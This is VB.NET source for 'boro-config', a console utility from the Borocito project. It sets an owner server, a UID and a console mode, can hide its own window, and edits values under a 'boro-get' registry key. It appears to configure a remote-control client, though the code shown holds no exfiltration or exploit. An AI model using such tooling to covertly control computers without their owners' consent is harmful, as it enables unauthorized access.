Imports System.Runtime.InteropServices
Imports Microsoft.Win32
Module Main
    <DllImport("kernel32.dll")>
    Function GetConsoleWindow() As IntPtr
    End Function
    <DllImport("user32.dll")>
    Function ShowWindow(ByVal hWnd As IntPtr, ByVal nCmdShow As Integer) As Boolean
    End Function
    Private Const SW_HIDE As Integer = 0
    Private Const SW_SHOW As Integer = 5

    Public ActualMode As String = "boro-config"
    Public IsFlagged As Boolean = False
    Public SetCMDColor As ConsoleColor = ConsoleColor.White

    Dim canExit As Boolean = False

    Sub Main(ByVal args As String())
        Console.Title = My.Application.Info.ProductName & " (" & My.Application.Info.Version.ToString & ")"
        Init()
        ReadParameters(args)
        Dim handle = GetConsoleWindow()
        If ConsoleMode = 0 Then
            ShowWindow(handle, SW_HIDE)
            'ShowWindow(handle, SW_SHOW)
        End If
        Console.WriteLine("Handle at " & handle.ToString)
        While Not canExit
            Console.Write(ActualMode & ">")
            AddToLog(handle.ToString, ReadCommandLine(Console.ReadLine()), IsFlagged, SetCMDColor)
            IsFlagged = False
            SetCMDColor = ConsoleColor.White
        End While
        SaveRegedit()
    End Sub

    Function ReadCommandLine(ByVal command As String) As String
        Try
            Dim args() As String = command.Split(" ")
            If ActualMode = "boro-config" Then
                If command.ToLower.StartsWith("set") Then
                    If args(1).ToLower.StartsWith("ownerserver") Then
                        OwnerServer = args(2)
                        Return "OwnerServer = " & OwnerServer

                    ElseIf args(1).ToLower.StartsWith("uid") Then
                        UID = args(2)
                        Return "UID = " & UID

                    ElseIf args(1).ToLower.StartsWith("consolemode") Then
                        ConsoleMode = args(2)
                        Return "ConsoleMode = " & ConsoleMode

                    Else

                        Return "No Key-Value?"
                    End If

                ElseIf command.ToLower = "boro-get" Then
                    Console.WriteLine("! -- CAUTION: Real-time operations -- !")
                    ActualMode = "boro-get"
                    Return "Switch console to '" & ActualMode & "'"

                ElseIf command.ToLower = "@rollback" Then
                    Return "no lmaoooo"

                ElseIf command.ToLower = "@commit" Then
                    Return SaveRegedit()

                ElseIf command.ToLower = "@clear" Then
                    Console.Clear()

                ElseIf command.ToLower = "@help" Then
                    Return "Find help at https://github.com/Zhenboro/borocito-components/tree/dev/boro-config"

                ElseIf command.ToLower = "@uninstall" Then
                    Return "Ups, not coded yet!"

                ElseIf command.ToLower = "@exit" Then
                    canExit = True
                    End

                Else
                    Return "Unknow command."
                End If
            Else
                If command.ToLower = "boro-config" Then
                    ActualMode = "boro-config"
                    Return "Switch console to '" & ActualMode & "'"
                Else
                    Return BoroGet_ReadCommandLine(args)
                End If
            End If

        Catch ex As Exception
            Return AddToLog("ReadCommandLine@boro-config", "Error: " & ex.Message, True)
        End Try
    End Function

    Function BoroGet_ReadCommandLine(ByVal command() As String) As String
        Try
            Dim regKey As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito\\boro-get", True)
            If regKey Is Nothing Then
                Return "boro-get is not installed."
            Else
                If command(0).ToLower.StartsWith("set") Then
                    regKey.SetValue(command(1), command(2))
                    Return command(1) & " key = " & command(2) & " value"

                ElseIf command(0).ToLower.StartsWith("remove") Then
                    regKey.DeleteValue(command(1))
                    Return command(1) & "value deleted"

                ElseIf command(0).ToLower.StartsWith("get") Then
                    Return command(1) & " = " & regKey.GetValue(command(1))

                Else
                    Return "Unknow command."
                End If
            End If
        Catch ex As Exception
            Return AddToLog("BoroGet_ReadCommandLine@boro-config", "Error: " & ex.Message, True)
        End Try
    End Function

End Module